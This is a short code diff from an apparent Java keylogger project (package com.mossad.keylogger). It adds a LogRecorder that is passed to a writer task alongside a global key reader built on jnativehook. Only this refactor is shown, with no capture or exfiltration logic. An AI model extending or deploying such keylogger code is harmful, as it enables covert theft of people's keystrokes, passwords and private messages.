@@ -1,5 +1,6 @@
 package com.mossad.keylogger;
 
+import com.mossad.keylogger.logging.LogRecorder;
 import com.mossad.keylogger.timer.WriterTask;
 import org.jnativehook.GlobalScreen;
 import org.jnativehook.NativeHookException;
@@ -11,11 +12,13 @@ public class LogicFlow {
     private Timer timer;
     private WriterTask writerTask;
     private KeyReader keyReader;
+    private LogRecorder logRecorder;
 
     public LogicFlow(){
         timer = new Timer();
         keyReader = new KeyReader();
-        writerTask = new WriterTask(keyReader);
+        logRecorder = new LogRecorder();
+        writerTask = new WriterTask(keyReader,logRecorder);
     }
 
     public void execute () throws NativeHookException {
